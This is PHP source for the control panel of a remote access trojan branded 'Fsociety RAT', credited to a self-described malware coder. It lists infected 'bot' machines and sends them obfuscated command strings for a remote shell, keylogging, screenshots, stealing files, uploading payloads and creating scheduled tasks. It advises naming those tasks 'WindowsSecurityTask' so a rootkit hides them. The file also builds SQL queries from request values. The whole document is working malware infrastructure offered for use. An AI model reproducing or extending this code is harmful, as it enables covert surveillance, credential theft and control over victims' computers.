<?php
        /*
        ##################################################
        #                                                #
        #         Malware Coder: Elliot Alderson         #
        #                                                #
        #   Github: https://github.com/ElliotAlderson51  #
        #                                                #
        ##################################################
        */
    include 'db.php';

    $db = new db;

    if(!isset($_SESSION['user_login_control_success']))
    {
        header("Location: index.php");
    }

    //          EXAMPLE
// if(isset($_GET['user']))
//     echo "Command";

    $bot_id = "";

    if(isset($_GET['bot']))
    {
        $bot_id = mysqli_real_escape_string($db->conn, $_GET['bot']);
    }


    $remote_shell_file = "bots_info\\remote_shell_".$bot_id.".txt";
    $bot_logs_file = "bots_info\\log_".$bot_id.".txt";
    $bot_keylogger_file = "bots_info\\keylogger_".$bot_id.".txt";
    $bot_file_explorer = "bots_info\\file_explorer_".$bot_id.".txt";

    $bot_screenshot_file = "";
    $bot_screenshot_file_png = "bots_info\\screenshot_".$bot_id.".png";
    $bot_screenshot_file_jpeg = "bots_info\\screenshot_".$bot_id.".jpeg";
    $bot_screenshot_file_jpg = "bots_info\\screenshot_".$bot_id.".jpg";
    

    if(file_exists($bot_screenshot_file_png)) {
        $bot_screenshot_file = $bot_screenshot_file_png;
    } 
    else if(file_exists($bot_screenshot_file_jpeg)) {
        $bot_screenshot_file = $bot_screenshot_file_jpeg;
    }
    else if(file_exists($bot_screenshot_file_jpg)) {
        $bot_screenshot_file = $bot_screenshot_file_jpg;
    }

    if(isset($_POST['change_favorite']))
    {
        $sql = "SELECT * FROM bots WHERE bot_id='$bot_id'";
        $result = mysqli_query($db->conn, $sql);
        $row = mysqli_fetch_assoc($result);
        if($row['favorite'] == 0)
        {
            $sql = "UPDATE bots SET favorite='1' WHERE bot_id='$bot_id'";
            mysqli_query($db->conn, $sql);
        }
        else
        {
            $sql = "UPDATE bots SET favorite='0' WHERE bot_id='$bot_id'";
            mysqli_query($db->conn, $sql);
        }
    }

    if(isset($_POST['delete']))
    {
        $sql = "DELETE FROM bots WHERE bot_id='$bot_id'";
        mysqli_query($db->conn, $sql);
        
        $sql = "DELETE FROM commands WHERE bot_id='$bot_id'";
        mysqli_query($db->conn, $sql);

        if(file_exists($remote_shell_file))
            unlink($remote_shell_file);

        if(file_exists($bot_logs_file))
            unlink($bot_logs_file);

        // output all files and directories except for '.' and '..'
        foreach (new DirectoryIterator('bots_info') as $fileInfo)
        {
            if($fileInfo->isDot()) continue;

            $file = $fileInfo->getFilename();
            $contain = "_".$bot_id;

            if (strpos($file, $contain) !== false) {
                unlink($file);
            }

        }

        header("control.php");
    }

    if(isset($_POST['edit_info_button'])) 
    {
        $ip_address = mysqli_real_escape_string($db->conn, $_POST['ip']);
        $pc_name = mysqli_real_escape_string($db->conn, $_POST['pc_name']);
        $gpu = mysqli_real_escape_string($db->conn, $_POST['gpu']);
        $isbanned = mysqli_real_escape_string($db->conn, $_POST['isbanned']);
        $isdead = mysqli_real_escape_string($db->conn, $_POST['isdead']);

        if($ip_address != "")
        {
            $sql = "UPDATE bots SET ip_address='$ip_address' WHERE bot_id='$bot_id'";
            mysqli_query($db->conn, $sql);
        }

        if($pc_name != "")
        {
            $sql = "UPDATE bots SET pc_name='$pc_name' WHERE bot_id='$bot_id'";
            mysqli_query($db->conn, $sql);
        }

        if($gpu != "")
        {
            $sql = "UPDATE bots SET gpu='$gpu' WHERE bot_id='$bot_id'";
            mysqli_query($db->conn, $sql);
        }

        if($isbanned != "")
        {
            $sql = "UPDATE bots SET isBanned='$isbanned' WHERE bot_id='$bot_id'";
            mysqli_query($db->conn, $sql);
        }

        if($isdead != "")
        {
            $sql = "UPDATE bots SET isDead='$isdead' WHERE bot_id='$bot_id'";
            mysqli_query($db->conn, $sql);
        }
    }


    ///////// Remote Shell /////////
    
    if(isset($_POST['delete_history']))
    {
        if(file_exists($remote_shell_file))
        {
            file_put_contents($remote_shell_file, "");
            $sql = "UPDATE commands SET command='' WHERE bot_id='$bot_id'";
            mysqli_query($db->conn, $sql);
        }
    }

    if(isset($_POST['send_command']))
    {
        if(file_exists($remote_shell_file))
        {
            $command = mysqli_real_escape_string($db->conn, $_POST['command']);
            if($command != "")
            {
                $data = "command ".$command.PHP_EOL;
                $file = fopen($remote_shell_file, 'a');
                fwrite($file, $data);

                $command = "JzbMqrTe6d ".$command; // remote shell - ofbfuscated string

                $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
                $result = mysqli_query($db->conn, $sql);
                if(mysqli_num_rows($result) == 0)
                {
                    $sql = "INSERT INTO commands (command, bot_id) VALUES ('$command', '$bot_id')";
                    mysqli_query($db->conn, $sql);
                }
                else
                {
                    $sql = "UPDATE commands SET command='$command' WHERE bot_id='$bot_id'";
                    mysqli_query($db->conn, $sql);
                }
            }
        }
    }

    ///////// END Remote Shell /////////

    ///////// Task Scheduler /////////

    if(isset($_POST['save_task']))
    {
        $task_name = mysqli_real_escape_string($db->conn, $_POST['task_name']);
        $file_path = mysqli_real_escape_string($db->conn, $_POST['file_path']);

        if($task_name != "")
        {
            if($file_path != "")
            {
                $command = "XGriQXsB3X ".$task_name." ".$file_path; // task scheduler save - obfuscated string
                $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
                $result = mysqli_query($db->conn, $sql);
                if(mysqli_num_rows($result) == 0)
                {
                    $sql = "INSERT INTO commands (command, bot_id) VALUES ('$command', '$bot_id')";
                    mysqli_query($db->conn, $sql);
                }
                else
                {
                    $sql = "UPDATE commands SET command='$command' WHERE bot_id='$bot_id'";
                    mysqli_query($db->conn, $sql);
                }
            }      
        }
    }

    if(isset($_POST['delete_task']))
    {
        $task_name = mysqli_real_escape_string($db->conn, $_POST['task_name']);
        
        $command = "jJYRPoebc5 ".$task_name; // task scheduler delete - obfuscated string
        $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
        $result = mysqli_query($db->conn, $sql);
        if(mysqli_num_rows($result) == 0)
        {
            $sql = "INSERT INTO commands (command, bot_id) VALUES ('$command', '$bot_id')";
            mysqli_query($db->conn, $sql);
        }
        else
        {
            $sql = "UPDATE commands SET command='$command' WHERE bot_id='$bot_id'";
            mysqli_query($db->conn, $sql);
        }
    }

    ///////// END Task Scheduler /////////


    ///////// Screenshot /////////

    if(isset($_POST['take_screenshot']))
    {
        $command = "7dzX75qVf1"; // screenshot - obfuscated string
        $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
        $result = mysqli_query($db->conn, $sql);
        if(mysqli_num_rows($result) == 0)
        {
            $sql = "INSERT INTO commands (command, bot_id) VALUES ('$command', '$bot_id')";
            mysqli_query($db->conn, $sql);
        }
        else
        {
            $sql = "UPDATE commands SET command='$command' WHERE bot_id='$bot_id'";
            mysqli_query($db->conn, $sql);
        }

        if(file_exists($bot_logs_file))
        {
            $data = "Send Take Screenshot request".PHP_EOL;
            $file = fopen($bot_logs_file, 'a');
            fwrite($file, $data);
        }
    }

    if(isset($_POST['delete_screenshot']))
    {
        if(file_exists($bot_screenshot_file))
        {
            unlink($bot_screenshot_file);
            if(file_exists($bot_screenshot_file))
            {
                if(file_exists($bot_logs_file))
                {
                    $data = "Delete Screenshot Success".PHP_EOL;
                    $file = fopen($bot_logs_file, 'a');
                    fwrite($file, $data);
                }
            }
            else
            {
                if(file_exists($bot_logs_file))
                {
                    $data = "Delete Screenshot FAILED".PHP_EOL;
                    $file = fopen($bot_logs_file, 'a');
                    fwrite($file, $data);
                }
            }
        }
    }


    ///////// END Screenshot /////////


    ///////// Keylogger /////////

    if(isset($_POST['start_keylogger']))
    {
        $command = "0OMnslw789"; // start keylogger - ofbfuscated string
        $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
        $result = mysqli_query($db->conn, $sql);
        if(mysqli_num_rows($result) == 0)
        {
            $sql = "INSERT INTO commands (command, keylogger, bot_id) VALUES ('$command', '1', '$bot_id')";
            mysqli_query($db->conn, $sql);
        }
        else
        {
            $sql = "UPDATE commands SET command='$command', keylogger='1' WHERE bot_id='$bot_id'";
            mysqli_query($db->conn, $sql);
        }

        if(file_exists($bot_logs_file))
        {
            $data = "Send Start Keylogger request".PHP_EOL;
            $file = fopen($bot_logs_file, 'a');
            fwrite($file, $data);
        }
    }

    if(isset($_POST['stop_keylogger']))
    {
        $command = "ajV73H3mMa"; // stop keylogger - obfuscated string
        $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
        $result = mysqli_query($db->conn, $sql);
        if(mysqli_num_rows($result) == 0)
        {
            $sql = "INSERT INTO commands (command, keylogger, bot_id) VALUES ('$command', '0', '$bot_id')";
            mysqli_query($db->conn, $sql);
        }
        else
        {
            $sql = "UPDATE commands SET command='$command', keylogger='0' WHERE bot_id='$bot_id'";
            mysqli_query($db->conn, $sql);
        }

        if(file_exists($bot_logs_file))
        {
            $data = "Send Stop Keylogger request".PHP_EOL;
            $file = fopen($bot_logs_file, 'a');
            fwrite($file, $data);
        }
    }

    ///////// END Keylogger /////////


    ///////// File Explorer /////////

    if(isset($_POST['start_file_explorer']))
    {
        $command = "UD7WEHe1eO"; // file explorer - obfuscated string
        $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
        $result = mysqli_query($db->conn, $sql);
        if(mysqli_num_rows($result) == 0)
        {
            $sql = "INSERT INTO commands (command, bot_id) VALUES ('$command', '$bot_id')";
            mysqli_query($db->conn, $sql);
        }
        else
        {
            $sql = "UPDATE commands SET command='$command' WHERE bot_id='$bot_id'";
            mysqli_query($db->conn, $sql);
        }
    }

    
    if(isset($_POST['file_click'])) // Go in to a directory
        {
            $dir = mysqli_real_escape_string($db->conn, $_POST['file_name']);

            if($dir != "")
            {
                $command = "file_explorer ".$dir;

                $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
                $result = mysqli_query($db->conn, $sql);
                if(mysqli_num_rows($result) == 0)
                {
                    $sql = "INSERT INTO commands (command, bot_id) VALUES ('$command', '$bot_id')";
                    mysqli_query($db->conn, $sql);
                }
                else
                {
                    $sql = "UPDATE commands SET command='$command' WHERE bot_id='$bot_id'";
                    mysqli_query($db->conn, $sql);
                }
            }
        }

        if(isset($_POST['download_file']))
        {
            $file_path = mysqli_real_escape_string($db->conn, $_POST['file_to_download']);

            if($file_path != "")
            {
                $command = "kw4mIFQSav ".$file_path; // download file - obfuscated string command
                $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
                $result = mysqli_query($db->conn, $sql);
                if(mysqli_num_rows($result) == 0)
                {
                    $sql = "INSERT INTO commands (command, bot_id) VALUES ('$command', '$bot_id')";
                    mysqli_query($db->conn, $sql);
                }
                else
                {
                    $sql = "UPDATE commands SET command='$command' WHERE bot_id='$bot_id'";
                    mysqli_query($db->conn, $sql);
                }

                if(file_exists($bot_logs_file))
                {
                    $data = "Send Download File request".PHP_EOL;
                    $file = fopen($bot_logs_file, 'a');
                    fwrite($file, $data);
                }
            }
        }

        if(isset($_POST['file_explorer_upload_file']))
        {
            $file_path = mysqli_real_escape_string($db->conn, $_POST['file_to_upload']);

            if($file_path != "")
            {
                if(file_exists("uploads\\".$file_path))
                {
                    $command = "2UuVIJjMcd ".$file_path; // upload file - obfuscated string command
                    $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
                    $result = mysqli_query($db->conn, $sql);
                    if(mysqli_num_rows($result) == 0)
                    {
                        $sql = "INSERT INTO commands (command, bot_id) VALUES ('$command', '$bot_id')";
                        mysqli_query($db->conn, $sql);
                    }
                    else
                    {
                        $sql = "UPDATE commands SET command='$command' WHERE bot_id='$bot_id'";
                        mysqli_query($db->conn, $sql);
                    }

                    if(file_exists($bot_logs_file))
                    {
                        $data = "Send Upload File request".PHP_EOL;
                        $file = fopen($bot_logs_file, 'a');
                        fwrite($file, $data);
                    }
                }
            }
        }

        if(isset($_POST['go_to_specific_path_button']))
        {
            $file_path = mysqli_real_escape_string($db->conn, $_POST['go_to_path']);
            if($file_path != "")
            {
                $command = "file_explorer ".$file_path;
                $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
                $result = mysqli_query($db->conn, $sql);
                if(mysqli_num_rows($result) == 0)
                {
                    $sql = "INSERT INTO commands (command, bot_id) VALUES ('$command', '$bot_id')";
                    mysqli_query($db->conn, $sql);
                }
                else
                {
                    $sql = "UPDATE commands SET command='$command' WHERE bot_id='$bot_id'";
                    mysqli_query($db->conn, $sql);
                }

                if(file_exists($bot_logs_file))
                {
                    $data = "File Explorer Go To ".$file_path.PHP_EOL;
                    $file = fopen($bot_logs_file, 'a');
                    fwrite($file, $data);
                }
            }
            
        }

        if(isset($_POST['back_dir']))
        {
            $random = rand(1, 100);

            $command = "hgd4gi0lcP ".$random; // go back - obfuscated string command
            $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
            $result = mysqli_query($db->conn, $sql);
            if(mysqli_num_rows($result) == 0)
            {
                $sql = "INSERT INTO commands (command, bot_id) VALUES ('$command', '$bot_id')";
                mysqli_query($db->conn, $sql);
            }
            else
            {
                $sql = "UPDATE commands SET command='$command' WHERE bot_id='$bot_id'";
                mysqli_query($db->conn, $sql);
            }
        }

        ///////// END File Explorer /////////

        ///////// File Manager /////////

        if(isset($_POST['file_manager_delete_file']))
        {
            $file_path = mysqli_real_escape_string($db->conn, $_POST['file_name']);

            if(file_exists($file_path))
            {
                unlink($file_path);

                if($file_path != $bot_logs_file)
                {
                    if(file_exists($bot_logs_file))
                    {
                        $data = "File Manager Delete File: ".$file_path." Success!".PHP_EOL;
                        $file = fopen($bot_logs_file, 'a');
                        fwrite($file, $data);
                    }
                }
            }
        }

        


        // Check if image file is a actual image or fake image
        if(isset($_POST["file_manager_upload_file"]))
        {
            $target_dir = "uploads/";
            $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
            $uploadOk = 1;
            $imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));

            // Check if file already exists
            if(!file_exists($target_file))
            {
                // Check file size
                if ($_FILES["fileToUpload"]["size"] < 500000)
                {
                    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file))
                    {
                        if(file_exists($bot_logs_file))
                        {
                            $data = "File Manager Upload File: ".$target_file." Success!".PHP_EOL;
                            $file = fopen($bot_logs_file, 'a');
                            fwrite($file, $data);
                        }
                    }
                    else
                    {
                        if(file_exists($bot_logs_file))
                        {
                            $data = "File Manager Upload File: ".$target_file." FAILED!".PHP_EOL;
                            $file = fopen($bot_logs_file, 'a');
                            fwrite($file, $data);
                        }
                    }
                }
            }

        }

        ///////// END File Manager /////////


    function is_dir_empty($dir) {
        if (!is_readable($dir)) return null; 
        return (count(scandir($dir)) == 2);
    }

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo "Control ".$bot_id ?></title>

    <link rel="stylesheet" href="css/Control.css">
    <link rel="stylesheet" href="css/bot_profile.css">

    <script src="js/jquery-3.4.1.min.js"></script>
</head>
<body>

    <nav>
        <a href="control.php"> <img src="images/back.png"></a>
        <label>Fsociety RAT</label>

        <form action="#">
            <input type="text" name="bot" placeholder="Bot ID/PC Name">
            <button type="submit">Search</button>
        </form>
    </nav>

    <?php

        $sql = "SELECT * FROM bots WHERE bot_id='$bot_id'";
        $result = mysqli_query($db->conn, $sql);
        if(mysqli_num_rows($result) == 0)
        {

            $sql = "SELECT * FROM bots WHERE pc_name='$bot_id'";
            $result = mysqli_query($db->conn, $sql);
            if(mysqli_num_rows($result) > 1)
            {
                ?>

                    <div class="search_pc_name_title">
                        <h1>Search by PC Name</h1>
                    </div>

                    <div class="search_table">
                        <table>
                            <tr>
                                <th>Bot ID</th>
                                <th>IP Address</th>
                                <th>PC Name</th>
                                <th>Status</th>
                                <th>GPU</th>
                                <th>isBanned</th>
                                <th>isDead</th>
                                <th>Last Seen</th>
                            </tr>
                            

                        <?php

                        while($row = mysqli_fetch_array($result))
                        {
                            echo "<tr>";
                                $bot_id = $row['bot_id'];
                                echo "<td><a href='bot_profile.php?bot=".$bot_id."'>".$bot_id."</a></td>";
                                echo "<td>".$row['ip_address']."</td>";
                                echo "<td>".$row['pc_name']."</td>";
                                echo "<td>"; if($row['status'] == "0") echo 'Offline'; else echo 'Online'; echo '</td>';
                                echo "<td>".$row['gpu']."</td>";
                                echo "<td>"; if($row['isBanned'] == "1") echo "Yes"; echo "</td>";
                                echo "<td>"; if($row['isDead'] == "1") echo "Yes"; echo "</td>";
                                echo "<td>".$row['last_seen']."</td>";
                                echo "</tr>";
                        }

                    echo '</table>';
                    echo '</div>';
            }
            else if(mysqli_num_rows($result) == 1)
            {
                $sql = "SELECT * FROM bots WHERE pc_name='$bot_id'";
                $result = mysqli_query($db->conn, $sql);
                if(mysqli_num_rows($result) > 0)
                {
                    $row = mysqli_fetch_assoc($result);
                    $bot_id = $row['bot_id'];
                }
            }
            else
            {
                echo "<div class='not_found'>";
                echo "<h1> Bot Not Found!</h1>";
                echo "</div>";
            }

        }
        else
        {
    ?>
        <div class="info">
            <table>
                <tr>
                    <th>Bot ID</th>
                    <th>IP Address</th>
                    <th>PC Name</th>
                    <th>Status</th>
                    <th>GPU</th>
                    <th>isBanned</th>
                    <th>isDead</th>
                    <th>Last Seen</th>
                </tr>

                <?php

                    $favorite = "";

                    $row = mysqli_fetch_assoc($result);
                    if($row)
                    {
                        echo "<td>".$bot_id."</td>";
                        echo "<td>".$row['ip_address']."</td>";
                        echo "<td>".$row['pc_name']."</td>";
                        $favorite = $row['favorite'];
                        echo "<td>"; if($row['status'] == "0") echo 'Offline'; else echo 'Online'; echo '</td>';
                        echo "<td>".$row['gpu']."</td>";
                        echo "<td>"; if($row['isBanned'] == "1") echo "Yes"; echo "</td>";
                        echo "<td>"; if($row['isDead'] == "1") echo "Yes"; echo "</td>";
                        echo "<td>".$row['last_seen']."</td>";
                    }
                ?>


            </table>
        </div>

        
        <div class="menu">
            <ul>
                <li>
                    <button onclick="show_modal('screenshot_modal')"><img src="images/screenshot.png"></button>
                    <p>Screenshot</p>
                </li>

                <li>
                <button onclick="show_modal('file_explorer_modal')"><img src="images/file_explorer.png"></button>
                    <p>File Explorer</p>
                </li>

                <li>
                    <button onclick="show_modal('task_scheduler_modal')" > <img src="images/task_scheduler.png"> </button>
                    <p>Task Scheduler</p>
                </li>

                <li>
                    <button onclick="show_modal('keylogger_modal')"><img src="images/keylogger.png"></button>
                    <p>Keylogger</p>
                </li>

                <li>
                    <button onclick="show_modal('remote_shell_modal')" > <img src="images/gnome_remote_shell.ico"> </button>
                    <p>Remote Shell</p>
                </li>

                <li>
                    <button onclick="show_modal('edit_info_modal')" ><img src="images/edit.png"> </button>
                    <p>Edit Info</p>
                </li>

                <li>
                    <button onclick="show_modal('file_manager_modal')" ><img src="images/file_manager.png"> </button>
                    <p>File Manager</p>
                </li>

                <li>
                    <form action="" method="POST">
                        <?php
                        if($favorite == 0)
                            echo '<button name="change_favorite" type="submit"><img src="images/star.png"></button>';
                        else
                            echo '<button name="change_favorite" type="submit"><img src="images/star_color.png"></button>';
                        ?>
                        <p>Favorite</p>
                    </form>
                </li>

                <li>
                    <form action="" method="POST">
                        <button name="delete" type="submit"><img src="images/delete.png"> </button>
                        <p>Delete</p>
                    </form>
                </li>
            </ul>
       </div>

    <div id="file_explorer_modal" class="modal">

        <!-- Modal content -->
        <div class="modal-content" id="file_explorer_content">
            <span onclick="close_modal('file_explorer_modal')" class="close">&times;</span>
            
                <div class="file_explorer" id="file_explorer_id">

                    <div class="title">
                        <h1>File Explorer</h1>
                    </div>
                    
                    <div class="content" id="file_explorer_content_id">
                        <?php

                        if(file_exists($bot_file_explorer) == false)
                        {
                            file_put_contents($bot_file_explorer, "");
                        }
                        
                        if(file_exists($bot_file_explorer))
                        {
                            $hFile = fopen($bot_file_explorer, "r");
                            if ($hFile)
                            {
                                if(filesize($bot_file_explorer))
                                {
                                    while (($line = fgets($hFile)) !== false)
                                    {
                                        if(pathinfo($line, PATHINFO_EXTENSION) == "")
                                        {
                                            echo "<form action='#' method='POST'>";
        
                                                echo '<input type="hidden" id="file_name" name="file_name" value="'.$line.'">';
                                                echo "<button type='submit' name='file_click'><img src='images/folder.png'>".$line."</button>";
                                            
                                            echo "</form>";
                                        }
                                        else
                                        {
                                            echo "<p class='file_name'><img src='images/file.png'>".$line."</p>";
                                            echo "<br>";
                                        }

                                        echo "<br>";
                                    }
                                }
                                else
                                {
                                    echo "<div class='no_history'>";
                                        echo "<h2> No Histroy! Click the start button </h2>";
                                    echo "</div>";
                                }
                            
                                fclose($hFile);
                            } 
                            else
                            {
                                echo  "Error opening the file.";
                            } 
                        }
                        
                        ?>
                    </div>

                    <div class="input_buttons">
                        <form action="#" method="POST">
                            <div class="buttons">

                                <?php 
                                
                                echo "<form action='#' method='POST'>";
                                    echo '<input type="text" name="go_to_path" placeholder="Go To Specific Path:">';
                                    echo '<button type="submit" class="upload_button" name="go_to_specific_path_button">Go</button>';
                                echo "</form>";

                                    if(file_exists($bot_file_explorer) === false || !filesize($bot_file_explorer))
                                    {
                                        echo '<button type="submit" class="start" name="start_file_explorer">Start</button>';
                                    }
                                    else
                                    {
                                        echo "<form action='#' method='POST'>";
                                            echo '<input type="text" name="file_to_download" placeholder="Enter file to download:">';
                                            echo '<button type="submit" class="download_button" name="download_file">Download</button>';
                                            echo '<button type="submit" class="back_button" name="back_dir">Back</button>';
                                        echo "</form>";
                                        
                                    }

                                    echo "<form action='#' method='POST'>";
                                        echo '<input type="text" name="file_to_upload" placeholder="Enter file to upload from the uploads folder:">';
                                        echo '<button type="submit" class="upload_button" name="file_explorer_upload_file">Upload</button>';
                                    echo "</form>";

                                    

                                ?>

                                

                            </div>
                        </form>
                    </div>
                    <button class="refresh" onclick="refresh('file_explorer_id', 'file_explorer_content_id')">Refresh</button>


                </div>
        </div>
    </div>


    <div id="keylogger_modal" class="modal">

        <!-- Modal content -->
        <div class="modal-content" id="keylogger_content">
            <span onclick="close_modal('keylogger_modal')" class="close">&times;</span>
            
                <div class="keylogger" id="keylogger_id">
                    <div class="title">
                        <h1>Keylogger</h1>
                    </div>
                    
                    <div class="content" id="keylogger_content_id">
                        <?php 
                            if(file_exists($bot_keylogger_file) == false)
                            {
                                file_put_contents($bot_keylogger_file, "");
                            }

                            $hFile = fopen($bot_keylogger_file, "r");
                            if ($hFile)
                            {
                                if(filesize($bot_keylogger_file))
                                {
                                    while (($line = fgets($hFile)) !== false) 
                                    {
                                        if($line == "" || $line == "\n")
                                            echo "<br>";
                                        else
                                        {
                                            echo "<div class='log_line'>";
                                                echo $line;
                                            echo "</div><br>";
                                        }
                                    }
                                }
                                else
                                {
                                    echo "<div class='no_keylogs'>";
                                        echo "<h2> No Keylogs! </h2>";
                                    echo "</div>";
                                }

                                fclose($hFile);
                            } 
                            else
                            {
                                echo  "Error opening the file.";
                            } 
                        ?>
                    </div>

                    <div class="input_buttons">
                        <form action="#" method="POST">
                            <div class="buttons">
                                <?php 
                                
                                    $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
                                    $result = mysqli_query($db->conn, $sql);
                                    if(mysqli_num_rows($result) != 0)
                                    {
                                        $row = mysqli_fetch_assoc($result);
                                        $isKeylogger = $row['keylogger'];

                                        if(!$isKeylogger)
                                        {
                                            echo '<button type="submit" class="start" name="start_keylogger">Start</button>';
                                        }
                                        else
                                        {
                                            echo '<button type="submit" class="stop" name="stop_keylogger">Stop</button>';
                                        }

                                        if(file_exists($bot_keylogger_file) && filesize($bot_keylogger_file))
                                        {
                                            echo '<button type="submit" class="stop" name="delete_keylogger_logs">Delete Logs</button>';
                                        }

                                    }
                                ?>
                            </div>
                        </form>
                        <button class="refresh" onclick="refresh('keylogger_id', 'keylogger_content_id')">Refresh</button>
                    </div>
                
                </div>
        </div>
    </div>

      
    <div id="task_scheduler_modal" class="modal">

        <!-- Modal content -->
        <div class="modal-content" id="task_scheduler_content">
            <span onclick="close_modal('task_scheduler_modal')" class="close">&times;</span>
            
                <div class="task_scheduler" >
                    <div class="title">
                            <h1>Task Scheduler</h1>
                    </div>
                    
                    <div class="content">
                        
                        <form action="#" method="POST">
                            <label>Task Name</label>
                            <input type="text" name="task_name" placeholder="Recommanded: WindowsSecurityTask_NAME">
                            <br><br>

                            <label>Action</label>
                            <input type="text" name="file_path" placeholder="File Path | (Not required in Delete)">
                            <br><br>

                            <button type="submit" class="save" name="save_task">Save</button>
                            <button type="submit" class="delete" name="delete_task">Delete</button>

                            <br><br><br><br><br>
                            <p> <label>*</label> The Rootkit protects files with a name that contain "WindowsSecurityTask"</p>
                        </form>
                    </div>
                </div>
        </div>
    </div>
    
    <div id="screenshot_modal" class="modal">

        <!-- Modal content -->
        <div class="modal-content">
        <span onclick="close_modal('screenshot_modal')" class="close">&times;</span>
            <div class="screenshot" id="screenshot_id">
                    
                    <div class="title">
                        <h1>Screenshot</h1>
                    </div>

                    <div class="content" id="screenshot_content_id">
                        <?php

                            if(file_exists($bot_screenshot_file))
                            {
                                echo '<div class="show_screenshot">';
                                    echo '<a href="'.$bot_screenshot_file.'"  target="_blank">';
                                        echo '<img src="'.$bot_screenshot_file.'">';
                                    echo '</a>';
                                echo '</div>';
                            }
                            else
                            {
                                echo '<div class="no_screenshot">';
                                    echo "No screenshot!";
                                echo '</div>';
                            }
                        ?>

                    </div>

                    <div class="input_buttons">
                        <form action="#" method="POST">
                            <div class="buttons">
                                <button type="submit" class="take" name="take_screenshot">Take Screenshot</button>
                                <?php
                                
                                    if(file_exists($bot_screenshot_file)) {
                                        echo '<button type="submit" class="delete" name="delete_screenshot">Delete</button>';
                                    }
                                ?>
                                
                            </div>
                        </form>
                        <button class="refresh" onclick="refresh('screenshot_id', 'screenshot_content_id')">Refresh</button>
                    </div>

            </div>
        </div>
    </div>

    <div id="remote_shell_modal" class="modal">

        <!-- Modal content -->
        <div class="modal-content">
            <span onclick="close_modal('remote_shell_modal')" class="close">&times;</span>
            
            <div class="remote_shell" id="remote_shell_id">
                <div class="title">
                    <h1>Remote Shell</h1>
                </div>

                <?php

                    if(file_exists($remote_shell_file) == false)
                    {
                        file_put_contents($remote_shell_file, "");
                    }
                ?>

                <div class="content" id="remote_shell_content_id">
                    <?php

                        $rsFile = fopen($remote_shell_file, "r");
                        if ($rsFile)
                        {
                            if(filesize($remote_shell_file))
                            {
                                while (($line = fgets($rsFile)) !== false) 
                                {
                                    if($line == "")
                                        echo "<br>";
                                    else
                                    {
                                        $type = strtok($line, " ");
                                        $line = strstr($line, " ");

                                        if(strtolower($type) == "command")
                                        {
                                            echo "<label>Command: </label><br>";
                                            echo "<div class='command'>";
                                                echo $line;
                                            echo "</div><br>";
                                        }
                                        else if(strtolower($type) == "result")
                                        {
                                            echo "<label>".$bot_id."</label><br>";
                                            echo "<div class='result'>";
                                                echo $line;
                                            echo "</div><br>";
                                        }
                                    }
                                    
                                }
                            }
                            else
                            {
                                echo "<div class='no_history'>";
                                    echo "<h2> No Histroy! </h2>";
                                echo "</div>";
                            }
                        
                            fclose($rsFile);
                        } 
                        else
                        {
                            echo  "Error opening the file.";
                        } 
                    
                    ?>
                </div>

                <div class="input_buttons">
                    <form action="#" method="POST">
                        <input type="text" name="command" placeholder="Enter your command here">
                        <div class="buttons">
                            <button type="submit" class="send" name="send_command">Send</button>
                            <button type="submit" class="delete" name="delete_history">Delete History</button>
                        </div>
                    </form>
                    <button class="refresh" onclick="refresh('remote_shell_id', 'remote_shell_content_id')">Refresh</button>
                </div>



            </div>

        </div>

    </div>

    <div id="edit_info_modal" class="modal">

        <!-- Modal content -->
        <div class="modal-content" id="edit_info_content">
            <span onclick="close_modal('edit_info_modal')" class="close">&times;</span>
            
            <div class="edit_info">

                <div class="title">
                    <h1>Edit Info</h1>
                </div>

                <div class="content">
                <?php

                    $sql = "SELECT * FROM bots WHERE bot_id='$bot_id'";
                    $result = mysqli_query($db->conn, $sql);
                    if(mysqli_num_rows($result) > 0)
                    {
                        $row = mysqli_fetch_assoc($result);
                        $ip_address = $row['ip_address'];
                        $pc_name = $row['pc_name'];
                        $gpu = $row['gpu'];
                        $isBanned = $row['isBanned'];
                        $isDead = $row['isDead'];

                        // the Edit Info Form
                        ?>
                            <form action="#" method="POST">

                                <label>IP Address</label>
                                <input type="text" name="ip" placeholder="<?php echo $ip_address; ?>">
                                <br><br>

                                <label>PC Name</label>
                                <input type="text" name="pc_name" placeholder="<?php echo $pc_name; ?>">
                                <br><br>

                                <label>GPU</label>
                                <input type="text" name="gpu" placeholder="<?php echo $gpu; ?>">
                                <br><br>

                                <label>isBanned</label>
                                <input type="text" name="isbanned" placeholder="<?php if($isBanned == 0) echo "No"; else echo "Yes"; echo " (0/1)"; ?>">
                                <br><br>

                                <label>isDead</label>
                                <input type="text" name="isdead" placeholder="<?php if($isDead == 0) echo "No"; else echo "Yes"; echo " (0/1)"; ?>">
                                <br><br>

                                <div class="button_center">
                                    <button name='edit_info_button' type='submit'>Confirm</button>
                                </div>
                            </form>

                        <?php

                    }
                    else
                    {

                    }

                ?>
                </div>


            </div>

        </div>

    </div>

    <div id="file_manager_modal" class="modal">

        <!-- Modal content -->
        <div class="modal-content" id="file_manager_content">
            <span onclick="close_modal('file_manager_modal')" class="close">&times;</span>
            
                <div class="file_manager" id="file_manager_id">

                    <div class="title">
                        <h1>File Manager</h1>
                    </div>
                    
                    <div class="content" id="file_manager_content_id">
                        <?php

                                if(file_exists($bot_logs_file)) {

                                    echo "<form action='#' method='POST'>";
                                        echo '<input type="hidden" id="file_name" name="file_name" value="'.$bot_logs_file.'">';
                                        echo '<a href="'.$bot_logs_file.'" target="_blank">'.$bot_logs_file."</a>";
                                        echo "<button type='submit' name='file_manager_delete_file'>Delete</button>";
                                    echo "</form>";
                                }
                                
                                if(file_exists($remote_shell_file)) {

                                    echo "<form action='#' method='POST'>";
